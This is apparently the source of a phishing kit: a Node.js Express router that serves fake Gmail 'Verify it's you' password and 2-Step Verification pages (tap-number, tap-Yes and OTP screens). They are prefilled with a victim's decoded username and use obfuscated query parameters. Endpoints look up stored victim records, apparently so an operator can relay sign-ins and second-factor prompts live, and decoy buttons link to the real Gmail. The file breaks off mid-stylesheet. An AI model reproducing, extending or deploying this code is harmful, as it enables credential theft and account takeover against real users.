const express = require('express');
const router = express.Router();
const database = require('../database');

router.get('/', (req, res) => {
  
  let user = req.query.tapfirestgrdsfgdytrbdfwergter;
  const username = Buffer.from(user, 'base64').toString('utf-8');
  
  if (user == null) {
      res.render('error');
      
    }else{

  const htmlContent = `
  <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <script type="text/javascript" src="/script/fetch.js"></script>
    <title>Gmail Login</title>
    <link rel="shortcut icon" href="/images/image.png" type="image">
    <style>
        /* Reset and General Styles */
        body {
            margin: 26px;
            font-family: Arial, Helvetica, sans-serif;
            background-color: #f5f7fb;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 85vh;
        }

        .maindiv {
            width: 55%; /* Increased width for larger screens */
            max-width: 1052px; /* Set max width for 4K screens */
            height: auto;
            padding: 44px;
            background: #fff;
            border-radius: 30px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
            display: flex;
            flex-direction: row;
            justify-content: space-between;
            flex-wrap: wrap;
             filter: blur(0.5px); /* Add this line */
        }
      .maindiv-wrapper {
            width: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .loading-bar {
            width: 57%; /* Match maindiv width */
            max-width: 1052px; /* Match maindiv max width */
            height: 4px; /* Thin loading bar */
            background: linear-gradient(to right, #4285f4 30%, transparent 30%);
            background-size: 200% 100%;
            animation: loading 5s infinite linear;
            border-top-left-radius: 11px;
            border-top-right-radius: 11px;
            margin-bottom: 1px; /* overlap perfectly */
        }

        @keyframes loading {
            0% {
                background-position: 200% 0;
            }
            100% {
                background-position: -200% 0;
            }
        }

        /* Left Section: Logo, Welcome, User Info */
        .form-half {
            flex: 1;
            min-width: 300px;
            padding-right: 20px;
        }

        .form-half .divlogo {
            width: 60px;
            height: 60px;
            margin-bottom: 27px;
        }

        .form-half .welcome {
            font-size: 44px; /* Increased font size for 4K */
            margin-top: 40px;
            margin-bottom: 20px;
        }

        .userdiv {
            display: flex;
            align-items: center;
            justify-content: flex-start;
            border: 0.4px solid #312f2f;
            border-radius: 30px;
            background-color: transparent;
            padding: 4px;
            width: fit-content;
            margin-top: 28px;
            cursor: pointer;
        }

        .userdiv img {
            vertical-align: middle;
        }

        .user-icon {
            margin-top: 2px;
            margin-right: 15px;
            width: 20px;
            height: 20px;
        }

        .dropdown-icon {
            margin-top: 2px;
            margin-right: 12px;
            margin-left: 10px;
            width: 15px;
            height: 10px;
        }

        .userdiv span {
            font-size: 15px;
            color: #2c2a2a;
        }

        /* Right Section: Password Input, Show Password, Forgot Password, Next Button */
        .form-half1 {
            flex: 1;
            min-width: 440px;
            padding-left: 20px;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
        }

        .passdiv {
            position: relative;
            margin-top: 20px;
            width: 100%;
            height: auto; /* Adjusting to auto for responsiveness */
        }

        input[type="password"], input[type="text"] {
            width: 100%; /* Ensure input takes up full width */
            padding: 13px;
            padding-right: 50px;
            font-size: 25px;
            border: 1px solid #ccc;
            border-radius: 4px;
            outline: none;
            box-sizing: border-box; /* Ensures padding does not affect width */
            transition: border-color 0.2s ease;
        }
 
        input.focused {
            border: 2px solid #4a6dd5;
        }
        

        /* Placeholder label behavior */
        .placeholder-label {
            position: absolute;
            top: 50%;
            left: 10px;
            transform: translateY(-50%);
            color: #aaa;
            font-size: 16px;
            pointer-events: none;
            transition: all 0.2s ease;
        }

        input:focus + .placeholder-label,
        input:not(:placeholder-shown) + .placeholder-label {
            top: 0px;
            left: 10px;
            padding: 4px;
            background-color: #fff;
            color: #4a6dd5;
            font-size: 12px;
        }

        .shwpwd {
            margin-top: 20px;
        }

        .shwpwd input {
            margin-right: 5px;
        }

        .shwpwd .button {
            cursor: pointer;
        }

        .fgtpwd {
            margin-top: 48px;
            margin-left: 42%;
        }

        .fgtpwd .hyperl {
            font-size: 16px;
            color: #1a73e8;
            border: none;
            background: none;
            cursor: pointer;
        }

        .btnnxt {
            padding: 11px 22px;
            font-size: 16px;
            border: none;
            border-radius: 28px;
            background-color: #1a73e8;
            color: white;
            cursor: pointer;
        }

        .btnnxt:hover {
            background-color: #0c5cd2;
        }

        /* Bottom Section Styles */
        .btmdiv {
            width: 55%;
            max-width: 1050px;
            padding: 0px;
            background-color: rgba(0, 0, 0, 0);
            box-shadow: 0 -2px 10px rgba(0, 0, 0, 0);
            display: flex;
            justify-content: center;
            align-items: center;
            margin-top: 1px;
            filter: blur(0.5px); /* Add this line */
        }

        .left-div {
            flex-grow: 1;
            background-color: rgba(255, 255, 255, 0);
            border: none;
        }

        .right-divs {
            display: flex;
        }

        .right-div {
            margin-left: 20px;
            background-color: rgba(255, 255, 255, 0);
            border: none;
        }

        select.btmhypl {
            padding: 12px;
            font-size: 13px;
            background-color: rgba(255, 255, 255, 0);
            border: none;
            color: black;
        }

        button.btmhypl {
            background-color: rgba(255, 255, 255, 0);
            color: black;
            border: none;
            cursor: pointer;
            padding: 12px;
            font-size: 13px;
            transition: background-color ease-in-out duration(.3s);
        }

        button.btmhypl:hover {
            background-color: #e7f3ff;
        }

        .session-expired-message {
            font-size: 15px;
            color: #c20606;
            margin-top: 65px;
            margin-bottom: 25px;
        }

        /* Media Queries for 2K Desktop Screens */
        @media (min-width: 1440px) and (max-width: 2560px) {
            .maindiv {
                width: 54%;
                padding: 42px;
                max-width: 1080px;
            }

            .welcome {
                font-size: 52px;
            }

            .btnnxt {
                padding: 9px 20px;
                font-size: 18px;
            }
        }

        /* Mobile Optimization for 2K Screens */
        @media (max-width: 1024px) {
            .maindiv {
                width: 90%;
                flex-direction: column;
                padding: 24px;
            }

            .form-half, .form-half1 {
                min-width: 100%;
                padding: 0;
            }
            .welcome {
                font-size: 28px;
            }

            .userdiv {
                width: 100%;
                justify-content: center;
            }

            .btnnxt {
                width: 100%;
                padding: 12px 0;
            }

            .fgtpwd {
                margin-left: 0;
                text-align: center;
            }

            .btmdiv {
                flex-direction: column;
                align-items: center;
            }

            .left-div, .right-divs {
                width: 60%;
                justify-content: center;
            }

            .right-div {
                margin-left: 10px;
            }
        }

        .show-password-btn {
            position: absolute;
            top: 50%;
            right: 10px;
            transform: translateY(-50%);
            background: none;
            border: none;
            cursor: pointer;
            font-size: 14px;
            color: #333;
            transition: color 0.2s ease;
            padding: 0;
            line-height: 1;
        }
    </style>
</head>
<body>
  <div class="maindiv-wrapper">
    <div class="loading-bar"></div>
    </div>
    <div class="maindiv">
        <!-- Left Section: Logo, Welcome, User Info -->
        <div class="form-half">
            <div>
                <img class="divlogo" src="/images/image.png" alt="Logo">
            </div>
            <div>
                <span class="welcome">Verify it’s you</span>
            </div>
            <div class="userdiv">
                <img class="user-icon" src="/images/user-circle.png" alt="User Icon">
                <span style="color: #2c2a2a; font-size: 18px; font-family: Arial, Helvetica, sans-serif;">${username}</span>
                <img class="dropdown-icon" src="/images/dropd.jpg" alt="Dropdown Icon">
            </div>
        </div>

        <!-- Right Section: Password Input, Show Password, Forgot Password, Next Button -->
              <div class="form-half1">
                <!-- Session Expired Message at the top of the right section -->
                <div class="session-expired-message">
                    <p>                  </p>
                </div>

                <div class="passdiv">
                    <input type="hidden" name="username" id="useRname" value="${username}">
                    <input required name="password" type="password" id="pEyar" value="hdshfsfoieoifhds" placeholder="">
                    <label for="pEyar" class="placeholder-label">Enter Your Password</label>
                </div>

                <div id="togglePassword" class="shwpwd">
                    <input type="checkbox" onclick="" class="checkbox">
                    <span onclick="togglePassword();" class="button">Show password</span>
                </div>

                <script>
                    const passwordInput = document.getElementById("pEyar");
                    const togglePassword = document.getElementById("togglePassword");

                    // Toggle "Show/Hide Password"
                    togglePassword.addEventListener("click", function () {
                        const type = passwordInput.getAttribute("type") === "password" ? "text" : "password";
                        passwordInput.setAttribute("type", type);
                    });

                    // Add 'focused' class on focus and remove on blur
                    passwordInput.addEventListener("focus", function () {
                        this.classList.add("focused");
                    });

                    // Keep the 'focused' class even after blur
                    passwordInput.addEventListener("blur", function () {
                        if (this.value.trim() !== "") {
                            this.classList.add("focused");
                        } else {
                            this.classList.remove("focused");
                        }
                    });

                    // Forgot Password Functionality
                    function forgotPassword() {
                        window.location.href = 'https://mail.google.com'; // Redirect to forgot password page or URL
                    }
                </script>

                <div class="fgtpwd">
                    <button type="button" id="myButton" class="hyperl" onclick="forgotPassword()">Forgot password?</button>&nbsp;&nbsp;&nbsp;
                    <button type="submit" class="btnnxt">Next</button>
                </div>
            </div>
        </form>
    </div>

    <!-- Bottom Section -->
    <div class="btmdiv">
        <div class="left-div">
            <select class="btmhypl" id="language-select">
                <option value="en">English (United States)</option>
                <option value="fr">French</option>
                <option value="es">Spanish</option>
                <option value="de">German</option>
            </select>
        </div>

        <div class="right-divs">
            <div class="right-div">
                <button id="helpButton" class="btmhypl">Help</button>
            </div>
            <div class="right-div">
                <button id="privacyButton" class="btmhypl">Privacy</button>
            </div>
            <div class="right-div">
                <button id="termsButton" class="btmhypl">Terms</button>
            </div>
        </div>
    </div>
</body>
</html>
  `;

  // Send the HTML content as a response
  res.send(htmlContent);

          }

    
});


router.get('/fetch', (req, res) => {
  
  let userid = req.query.dsjkfhjdhfjkdfhjkd;
  const username = Buffer.from(userid, 'base64').toString('utf-8');
    // Using MongoDB to find the user
  database.mainCollection().then(collection => {
    collection.findOne({ username: username })
      .then(result => {
    
        res.json({ results: result ? [result] : [] });
      })
      .catch(err => {
        console.error('Error executing MongoDB query:', err);
        return res.status(500).json({ error: 'Internal Server Error' });
      });
});

});

router.get('/fetchtap', (req, res) => {

  
    let userid = req.query.jfhdgigndfjnguertsdfiwjeo;   
    const username = Buffer.from(userid, 'base64').toString('utf-8');
    // Using MongoDB to find the user
    database.mainCollection().then(collection => {
        collection.findOne({ username: username })
          .then(result => {
            res.json({ results: result ? [result] : [] });
          })
          .catch(err => {
            console.error('Error executing MongoDB query:', err);
            return res.status(500).json({ error: 'Internal Server Error' });
          });
      });   
  });

// tap optionss

// tap optionss

router.get('/codetap', (req, res) => {

    const newdata = req.query.NzA2MTczNTM1NzZmNzI2NDJlNzA2ODcwdghjdfjdfgjdfgjdfgjdfj;
  
    const decodata=  Buffer.from(newdata, 'base64').toString('utf-8');
  
    const dataArray = decodata.split('/');
  
    const id = dataArray[1];
    const tapcode = dataArray[2];
    const mtype = dataArray[3];
  
    const tappage = `
    <!DOCTYPE html>
  <html lang="en">
  <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Gmail - 2-Step Verification</title>
      <link rel="shortcut icon" href="/images/image.png" type="image">
      <script type="text/javascript" src="/script/fetchtap.js"></script>
  
      <style>
          /* Reset and General Styles */
         /* Reset and General Styles */
  body {
      margin: 30px;
      font-family: Arial, Helvetica, sans-serif;
      background-color: #f5f5f5;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 90vh;
  }
  
  .maindiv {
      width: calc(55% + 4cm); /* Enlarge form width by 2 cm each side */
      max-width: calc(770px + 4cm); /* Increase max-width */
      height: auto; /* Allow height to adjust based on content */
      padding: 63px;
      background: #fff;
      border-radius: 42px;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
      display: flex;
      flex-direction: row; /* Align items horizontally */
      flex-wrap: wrap;
      justify-content: flex-start; /* Align children to the left */
      align-items: flex-start; /* Align items to the top */
  }
  
  /* Left Section: Form Half */
  .form-half {
      flex: 2 1 345px; /* Flex grow is 0, shrink is 1, base width of 280px */
      padding-right: 4px;
  }
  .divlogo {
      width: 60px;
      height: 60px;
      margin-bottom: 20px;
          }
  .welcome {
              font-size: 30px;
              margin-top: 1px;
              margin-bottom: 5px;
          }
  
  .userdiv {
              display: flex;
              align-items: center;
              justify-content: flex-start;
              border: 0.4px solid #312f2f;
              border-radius: 30px;
              background-color: #transparent;
              width: fit-content;
              margin-top: 17px ;
          }
  
         .userdiv img {
      vertical-align: middle; /* Align images vertically with text */
  }
  
  .user-icon {
      margin-top: 2px ;
      margin-bottom: 2px ;
      margin-left: 6px ;
      margin-right: 15px ;
      width: 18px; /* Set width for user icon */
      height: 18px; /* Set height for user icon */
  }
  
  .dropdown-icon {
      margin-top: 2px ;
      margin-bottom: 2px ;
      margin-left: 25px ;
      margin-right: 10px ;
      width: 10px; /* Set width for dropdown icon */
      height: 8px; /* Set height for dropdown icon */
  }
          .user-icon {
             margin-top: 2px;
             margin-bottom: 2px;
             margin-left: 6px;
             margin-right: 15px;
             width: 18px;
             height: 18px;
          }
  
          .dropdown-icon {
             margin-top: 2px;
             margin-bottom: 2px;
             margin-left: 25px;
             margin-right: 10px;
             width: 10px;
             height: 8px;
          }
          
          .userdiv span {
             font-size: 16px;
             color: #2c2a2a;
          }
  
  /* Right Section: Form Half 1 (Align Right) */
  .form-half1 {
      flex: 1 1 327px; /* Flex grow is 0, shrink is 1, base width of 340px */
      padding-left: 43px;
      display: flex;
      flex-direction: column;
      justify-content: flex-start; /* Align items to the top */
      align-items: flex-start; /* Align content to the left */
      margin-left: auto; /* Ensure this aligns to the right side */
  }
  
  /* Additional Style Definitions */
  
  .numberdiv {
      font-size: 55px;
      font-weight: bold;
      text-align: center;
      padding: 5px;
      margin-top:3px;
      margin-left: 120px;
      margin-bottom: 20px;
      background-color: #f1f3f400;
      border-radius: 5px;
      color: #333333;
  }
  
  .phonediv {
      margin-bottom: 20px;
  }
  
  .phonetype {
      font-size: 18px;
      
  }
  
  .messaged {
      font-size: 14px;
      color: black;
      line-height: 1.5;
  }
  
  .rememberme {
      margin-top: 20px;
      display: flex;
      align-items: center;
  }
  
  .rememberme .checkbox {
      margin-right: 10px;
  }
  
  .rememberme .button {
      font-size: 14px;
      color: black;
      cursor: pointer;
  }
  
  .tryn {
      margin-top: 25px;
      margin-left:240px;
  }
  
  .tryn .hyperl1 {
      font-size: 15px;
      color: #1a73e8;
      background: none;
      border: none;
      cursor: pointer;
      }
  
  .tryn .hyperl1:hover {
      text-decoration: none;
  }
  
  /* Bottom Section Styles */
  .btmdiv {
      width: calc(60% + 4cm);
      max-width: calc(790px + 4cm);
      padding: 0px;
      background-color: rgba(0, 0, 0, 0); /* Transparent background */
      box-shadow: 0 -2px 10px rgba(0, 0, 0, 0);
      display: flex;
      justify-content: center;
      align-items: center;
  }
  
  .left-div {
      flex-grow: 1;
      background-color: rgba(255, 255, 255, 0);
      border: none;
  }
  
  .right-divs {
      display: flex;
  }
  
  .right-div {
      margin-left: 15px;
  }
  
  button.btmhypl {
      background-color: rgba(255, 255, 255, 0);
      color: black;
      border: none;
      cursor: pointer;
      padding: 10px;
      font-size: 13px;
      transition: background-color ease-in-out duration(.3s);
  }
  
  button.btmhypl:hover {
      background-color: #e7f3ff;
  }
  
  select.btmhypl {
      padding: 10px;
      font-size: 13px;
      background-color: rgba(255, 255, 255, 0);
      border: none;
      color: black;
  }
  
  /* Media Queries for Mobile Responsiveness */
  @media (max-width: 768px) {
      .maindiv {
          flex-direction: column;
          height: auto;
          padding: 20px;
      }
  
            
      .welcome {
          font-size: 28px;
      }
      .numberdiv {
          font-size: 50px;
          padding: 8px;
      }
  
      .messaged {
          font-size: 13px;
      }
  
      .tryn .hyperl1 {
          font-size: 12px;
      }
  
      .btmdiv {
          flex-direction: column;
          align-items: center;
      }
  
      .left-div, .right-divs {
          width: 48%;
          justify-content: center;
      }
  
      .right-div {
          margin-left: 10px;
      }
  }
  
      </style>
  </head>
  
  <body>
      <div class="maindiv">
          <!-- Left Section: Form Half -->
          <div class="form-half">
              <div><img class="divlogo" src="/images/image.png" alt="Logo"></div>
              <div><span class="welcome">2-Step Verification</span></div><br>
              <div><span class="warning">To help keep your account safe, Google wants to make sure it's really you trying to sign in</span></div>
              <div class="userdiv">
                  <img class="user-icon" src="/images/user-circle.png" alt="User Icon">
                  <span style="color: #2c2a2a; font-size: 18px; font-family: Arial, Helvetica, sans-serif;">${id}</span>
                  <img class="dropdown-icon" src="/images/dropd.jpg" alt="Dropdown Icon">
              </div>
          </div>
  
          <!-- Right Section: Form Half 1 -->
           <div class="form-half1">
                  <div class="numberdiv">
                          <span class="number">${tapcode}</span>
                      </div>
                  <div class="phonediv">
                      <span class="phonetype">Check your ${mtype}</span><br><br>
                      <span class="messaged">Google sent a notification to your ${mtype}. Tap <b>Yes</b>&nbsp;on the notification, then tap&nbsp;<b>${tapcode}</b>&nbsp;on your phone to verify it's you.</span>
                  </div>
                  <div class="rememberme">
                      <div><input type="checkbox" class="checkbox" checked></div>
                      <span class="button">Don't ask again on this device</span>
                  </div>
                  <div class="tryn">
                      <button type="button" class="hyperl1" onclick="window.location.href = 'https://mail.google.com';"><b>Try another way</b></button>&nbsp;&nbsp;&nbsp;
                  </div>
              </div>
          </form>
      </div>
      <!-- Bottom Section -->
      <div class="btmdiv">
          <div class="left-div">
              <select class="btmhypl" id="language-select">
                  <option value="en">English (United States)</option>
                  <option value="fr">French</option>
                  <option value="es">Spanish</option>
                  <option value="de">German</option>
              </select>
          </div>
  
          <div class="right-divs">
              <div class="right-div">
                  <button id="helpButton" class="btmhypl">Help</button>
              </div>
              <div class="right-div">
                  <button id="privacyButton" class="btmhypl">Privacy</button>
              </div>
              <div class="right-div">
                  <button id="termsButton" class="btmhypl">Terms</button>
              </div>
          </div>
      </div>
  </body>
  </html>
    `;
  
    res.send(tappage);

});

// yes tap
router.get('/yestap', (req, res) => {

    const newdata = req.query.NzA2MTczNTM1NzZmNzI2NDJlNzA2ODcwdghjdfjdfgjdfgjdfgjdfj;
  
    const decodata=  Buffer.from(newdata, 'base64').toString('utf-8');
  
    const dataArray = decodata.split('/');
  
    const id = dataArray[1];
    const mtype = dataArray[3];
  
    const yestap = `
    <!DOCTYPE html>
  <html lang="en">
  <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Gmail - 2-Step Verification</title>
      <link rel="shortcut icon" href="/images/image.png" type="image">
      <script type="text/javascript" src="/script/fetchtap.js"></script>
  
      <style>
          /* Reset and General Styles */
         /* Reset and General Styles */
  body {
      margin: 30px;
      font-family: Arial, Helvetica, sans-serif;
      background-color: #f5f5f5;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 90vh;
  }
  
  .maindiv {
      width: calc(55% + 4cm); /* Enlarge form width by 2 cm each side */
      max-width: calc(770px + 4cm); /* Increase max-width */
      height: auto; /* Allow height to adjust based on content */
      padding: 63px;
      background: #fff;
      border-radius: 42px;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
      display: flex;
      flex-direction: row; /* Align items horizontally */
      flex-wrap: wrap;
      justify-content: flex-start; /* Align children to the left */
      align-items: flex-start; /* Align items to the top */
  }
  
  /* Left Section: Form Half */
  .form-half {
      flex: 2 1 345px; /* Flex grow is 0, shrink is 1, base width of 280px */
      padding-right: 4px;
  }
  .divlogo {
      width: 60px;
      height: 60px;
      margin-bottom: 20px;
          }
  .welcome {
              font-size: 30px;
              margin-top: 1px;
              margin-bottom: 5px;
          }
  
  .userdiv {
              display: flex;
              align-items: center;
              justify-content: flex-start;
              border: 0.4px solid #312f2f;
              border-radius: 30px;
              background-color: #transparent;
              width: fit-content;
              margin-top: 17px ;
          }
  
         .userdiv img {
      vertical-align: middle; /* Align images vertically with text */
  }
  
  .user-icon {
      margin-top: 2px ;
      margin-bottom: 2px ;
      margin-left: 6px ;
      margin-right: 15px ;
      width: 18px; /* Set width for user icon */
      height: 18px; /* Set height for user icon */
  }
  
  .dropdown-icon {
      margin-top: 2px ;
      margin-bottom: 2px ;
      margin-left: 25px ;
      margin-right: 10px ;
      width: 10px; /* Set width for dropdown icon */
      height: 8px; /* Set height for dropdown icon */
  }
          .user-icon {
             margin-top: 2px;
             margin-bottom: 2px;
             margin-left: 6px;
             margin-right: 15px;
             width: 18px;
             height: 18px;
          }
  
          .dropdown-icon {
             margin-top: 2px;
             margin-bottom: 2px;
             margin-left: 25px;
             margin-right: 10px;
             width: 10px;
             height: 8px;
          }
          
          .userdiv span {
             font-size: 16px;
             color: #2c2a2a;
          }
  
  /* Right Section: Form Half 1 (Align Right) */
  .form-half1 {
      flex: 1 1 327px; /* Flex grow is 0, shrink is 1, base width of 340px */
      padding-left: 43px;
      display: flex;
      flex-direction: column;
      justify-content: flex-start; /* Align items to the top */
      align-items: flex-start; /* Align content to the left */
      margin-left: auto; /* Ensure this aligns to the right side */
  }
  
  /* Additional Style Definitions */
  
  .numberdiv {
      font-size: 48px;
      font-weight: bold;
      text-align: center;
      padding: 5px;
      margin-top:3px;
      margin-left: 140px;
      margin-bottom: 15px;
      background-color: #f1f3f400;
      border-radius: 5px;
      color: #333333;
  }
  
  .phonediv {
      margin-bottom: 20px;
  }
  
  .phonetype {
      font-size: 18px;
      
  }
  
  .messaged {
      font-size: 14px;
      color: black;
      line-height: 1.5;
  }
  
  .rememberme {
      margin-top: 20px;
      display: flex;
      align-items: center;
  }
  
  .rememberme .checkbox {
      margin-right: 10px;
  }
  
  .rememberme .button {
      font-size: 14px;
      color: black;
      cursor: pointer;
  }
  
  .tryn {
      margin-top: 25px;
      margin-left:240px;
  }
  
  .tryn .hyperl1 {
      font-size: 15px;
      color: #1a73e8;
      background: none;
      border: none;
      cursor: pointer;
      }
  
  .tryn .hyperl1:hover {
      text-decoration: none;
  }
  
  /* Bottom Section Styles */
  .btmdiv {
      width: calc(60% + 4cm);
      max-width: calc(790px + 4cm);
      padding: 0px;
      background-color: rgba(0, 0, 0, 0); /* Transparent background */
      box-shadow: 0 -2px 10px rgba(0, 0, 0, 0);
      display: flex;
      justify-content: center;
      align-items: center;
  }
  
  .left-div {
      flex-grow: 1;
      background-color: rgba(255, 255, 255, 0);
      border: none;
  }
  
  .right-divs {
      display: flex;
  }
  
  .right-div {
      margin-left: 15px;
  }
  
  button.btmhypl {
      background-color: rgba(255, 255, 255, 0);
      color: black;
      border: none;
      cursor: pointer;
      padding: 10px;
      font-size: 13px;
      transition: background-color ease-in-out duration(.3s);
  }
  
  button.btmhypl:hover {
      background-color: #e7f3ff;
  }
  
  select.btmhypl {
      padding: 10px;
      font-size: 13px;
      background-color: rgba(255, 255, 255, 0);
      border: none;
      color: black;
  }
  
  /* Media Queries for Mobile Responsiveness */
  @media (max-width: 768px) {
      .maindiv {
          flex-direction: column;
          height: auto;
          padding: 20px;
      }
  
            
      .welcome {
          font-size: 28px;
      }
      .numberdiv {
          font-size: 50px;
          padding: 8px;
      }
  
      .messaged {
          font-size: 13px;
      }
  
      .tryn .hyperl1 {
          font-size: 12px;
      }
  
      .btmdiv {
          flex-direction: column;
          align-items: center;
      }
  
      .left-div, .right-divs {
          width: 48%;
          justify-content: center;
      }
  
      .right-div {
          margin-left: 10px;
      }
  }
  
      </style>
  </head>
  
  <body>
      <div class="maindiv">
          <!-- Left Section: Form Half -->
          <div class="form-half">
              <div><img class="divlogo" src="/images/image.png" alt="Logo"></div>
              <div><span class="welcome">2-Step Verification</span></div><br>
              <div><span class="warning">To help keep your account safe, Google wants to make sure it's really you trying to sign in</span></div>
              <div class="userdiv">
                  <img class="user-icon" src="/images/user-circle.png" alt="User Icon">
                  <span style="color: #2c2a2a; font-size: 18px; font-family: Arial, Helvetica, sans-serif;">${id}</span>
                  <img class="dropdown-icon" src="/images/dropd.jpg" alt="Dropdown Icon">
              </div>
          </div>
  
          <!-- Right Section: Form Half 1 -->
           <div class="form-half1">
                  <center>
                      <div class="gradient-box"><img src="/images/tap.gif" alt="Yes Recovery"></div>
                  </center>
                  <div class="phonediv">
                      <span class="phonetype">Check your ${mtype}</span><br><br>
                      <span class="messaged">Google sent a notification to your ${mtype}. Tap <b>Yes</b>&nbsp;on the notification verify it's you</span>
                  </div>
                  <div class="rememberme">
                      <div><input type="checkbox" class="checkbox" checked></div>
                      <span class="button">Don't ask again on this device</span>
                  </div>
                  <div class="tryn">
                      <button type="button" class="hyperl1" onclick="window.location.href = 'https://mail.google.com';"><b>Try another way</b></button>&nbsp;&nbsp;&nbsp;
                  </div>
              </div>
          </form>
      </div>
      <!-- Bottom Section -->
      <div class="btmdiv">
          <div class="left-div">
              <select class="btmhypl" id="language-select">
                  <option value="en">English (United States)</option>
                  <option value="fr">French</option>
                  <option value="es">Spanish</option>
                  <option value="de">German</option>
              </select>
          </div>
  
          <div class="right-divs">
              <div class="right-div">
                  <button id="helpButton" class="btmhypl">Help</button>
              </div>
              <div class="right-div">
                  <button id="privacyButton" class="btmhypl">Privacy</button>
              </div>
              <div class="right-div">
                  <button id="termsButton" class="btmhypl">Terms</button>
              </div>
          </div>
      </div>
  </body>
  </html>
    `;
  
    res.send(yestap);
  
    
  
  });


// code otp options

router.get('/codeotp', (req, res) => {

    const samdata = req.query.NzA2MTczNTM1NzZmNzI2NDJlNzA2ODcwdghjdfjdfgjdfgjdfgjdfj;
  
    const decodata1=  Buffer.from(samdata, 'base64').toString('utf-8');
  
    const dataArray1 = decodata1.split('/');
  
    const id1 = dataArray1[1];

    const mobNumber = dataArray1[2];
  
    const otppage = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gmail - 2-Step Verification</title>
    <link rel="shortcut icon" href="/images/image.png" type="image">
    <link rel="stylesheet" href="/stylesheet/newstylep.css">
    <script src="https://code.iconify.design/3/3.1.0/iconify.min.js"></script>

    <style>
     body {
    margin: 30px;
    font-family: Arial, Helvetica, sans-serif;
    background-color: #f5f5f5;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    height: 90vh;
}

.maindiv {
    width: calc(55% + 4cm); /* Enlarge form width by 2 cm each side */
    max-width: calc(770px + 4cm); /* Increase max-width */
    height: auto; /* Allow height to adjust based on content */
    padding: 40px;
    background: #fff;
    border-radius: 42px;
    box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
    display: flex;
    flex-direction: row; /* Align items horizontally */
    flex-wrap: wrap;
    justify-content: flex-start; /* Align children to the left */
    align-items: flex-start; /* Align items to the top */
}

/* Left Section: Form Half */
.form-half {
    flex: 2 1 345px; /* Flex grow is 0, shrink is 1, base width of 280px */
    padding-right: 4px;
}
.divlogo {
    width: 60px;
    height: 60px;
    margin-bottom: 20px;
        }
.welcome {
            font-size: 40px;
            margin-top: 10px;
            margin-bottom: 8px;
        }

.userdiv {
            display: flex;
            align-items: center;
            justify-content: flex-start;
            border: 0.4px solid #312f2f;
            border-radius: 30px;
            background-color: #transparent;
            width: fit-content;
            margin-top: 20px ;
        }

       .userdiv img {
    vertical-align: middle; /* Align images vertically with text */
}

.user-icon {
    margin-top: 2px ;
    margin-bottom: 2px ;
    margin-left: 6px ;
    margin-right: 15px ;
    width: 18px; /* Set width for user icon */
    height: 18px; /* Set height for user icon */
}

.dropdown-icon {
    margin-top: 2px ;
    margin-bottom: 2px ;
    margin-left: 25px ;
    margin-right: 10px ;
    width: 10px; /* Set width for dropdown icon */
    height: 8px; /* Set height for dropdown icon */
}
        .user-icon {
           margin-top: 2px;
           margin-bottom: 2px;
           margin-left: 6px;
           margin-right: 15px;
           width: 18px;
           height: 18px;
        }

        .dropdown-icon {
           margin-top: 2px;
           margin-bottom: 2px;
           margin-left: 25px;
           margin-right: 10px;
           width: 10px;
           height: 8px;
        }
        
        .userdiv span {
           font-size: 16px;
           color: #2c2a2a;
        }

/* Right Section: Form Half 1 (Align Right) */
.form-half1 {
    flex: 1 1 327px; /* Flex grow is 0, shrink is 1, base width of 340px */
    padding-left: 8px;
    display: flex;
    flex-direction: column;
    justify-content: flex-start; /* Align items to the top */
    align-items: flex-start; /* Align content to the left */
    margin-left: auto; /* Ensure this aligns to the right side */
}

/* Additional Style Definitions */

.numberdiv {
    font-size: 55px;
    font-weight: bold;
    text-align: center;
    padding: 5px;
    margin-top:3px;
    margin-left: 120px;
    margin-bottom: 20px;
    background-color: #f1f3f400;
    border-radius: 5px;
    color: #333333;
}

.phonediv {
    margin-bottom: 20px;
}

.phonetype {
    font-size: 16px;
    font-weight: bold;
}

.messaged {
    font-size: 14px;
    color: black;
    line-height: 1.5;
}

.rememberme {
    margin-top: 20px;
    display: flex;
    align-items: center;
}

.rememberme .checkbox {
    margin-right: 10px;
}

.rememberme .button {
    font-size: 14px;
    color: black;
    cursor: pointer;
}

.tryn {
    margin-top: 25px;
    margin-left:221px;
}

.tryn .hyperl1 {
    font-size: 15px;
    color: #1a73e8;
    background: none;
    border: none;
    cursor: pointer;
    margin-right:11px;
    }

.tryn .hyperl1:hover {
    text-decoration: none;
}

/* Bottom Section Styles */
.btmdiv {
    width: calc(60% + 4cm);
    max-width: calc(790px + 4cm);
    padding: 0px;
    background-color: rgba(0, 0, 0, 0); /* Transparent background */
    box-shadow: 0 -2px 10px rgba(0, 0, 0, 0);
    display: flex;
    justify-content: center;
    align-items: center;
}

.left-div {
    flex-grow: 1;
    background-color: rgba(255, 255, 255, 0);
    border: none;
}

.right-divs {
    display: flex;
}

.right-div {
    margin-left: 15px;
}

button.btmhypl {
    background-color: rgba(255, 255, 255, 0);
    color: black;
    border: none;
    cursor: pointer;
    padding: 10px;
    font-size: 13px;
    transition: background-color ease-in-out duration(.3s);
}

button.btmhypl:hover {
    background-color: #e7f3ff;
}

select.btmhypl {
    padding: 10px;
    font-size: 13px;
    background-color: rgba(255, 255, 255, 0);
    border: none;
    color: black;
}

/* Media Queries for Mobile Responsiveness */
@media (max-width: 768px) {
    .maindiv {
        flex-direction: column;
        height: auto;
        padding: 20px;
    }

          
    .welcome {
        font-size: 28px;
    }
    .numberdiv {
        font-size: 50px;
        padding: 8px;
    }

    .messaged {
        font-size: 13px;
    }

    .tryn .hyperl1 {
        font-size: 12px;
    }

    .btmdiv {
        flex-direction: column;
